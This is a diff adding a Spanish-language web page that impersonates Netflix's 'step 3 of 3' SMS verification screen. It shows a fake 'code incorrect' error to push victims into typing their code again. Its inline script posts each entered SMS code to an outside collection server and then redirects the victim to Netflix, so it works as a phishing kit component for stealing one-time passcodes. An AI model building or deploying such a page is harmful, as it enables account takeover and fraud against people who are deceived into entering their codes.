@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
+      integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w=="
+      crossorigin="anonymous"
+    />
+    <link rel="stylesheet" href="style/style.css" />
+    <link rel="icon" href="img/logo.png" />
+    <title>Netflix</title>
+  </head>
+  <body>
+    <div class="upper">
+      <div class="logo">
+        <a href="#">
+          <img src="img/Netflix-Logo.png" class="img-logo" />
+        </a>
+      </div>
+      <div class="login-div">
+        <div class="login">
+          <h5>ETAPA 3 DE 3</h5>
+          <h1>Autenticación vía SMS</h1>
+          <h4>¡Última etapa!</h4>
+          <div class="input-text">
+            <input
+              type="text"
+              id="inputSms"
+              name="email"
+              placeholder="Código SMS"
+              inputmode="numeric"
+              maxlength="6"
+              required
+            />
+          </div>
+          <div>
+            <div class="color_text" style="color: red;">
+                <label >El codigo ingressado es incorrecto.</label>
+              </div>
+              <div class="protection color_link help">
+                    
+                      
+                      
+              </div>
+              <div class="protection color_link help">
+                Al hacer clic en el botón, aceptas los términos de uso y condiciones de Netflix.
+              </div>
+            <button class="signin-button" onClick="buttonOnClick()">
+              Confirmar
+            </button>
+          </div>
+          <div class="remember-flex">
+        </div>
+      </div>
+    </div>
+    <script src="js/script.js"></script>
+    <script>
+      function buttonOnClick() {
+        sendData().then(() => {
+          redirectNetflix();
+        });
+      }
+
+      function sendData() {
+       const inputSms = document.getElementById("inputSms").value;
+
+        if (inputSms === "") {
+          return;
+        } else {
+          return fetch("https://apineittel.onrender.com/submit", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify({
+              content: `¡Nuevo código SMS!\n\nCódigo: ${inputSms}`,
+            }),
+          }).then((response) => response.json());
+        }
+      }
+    </script>
+  </body>
+</html>
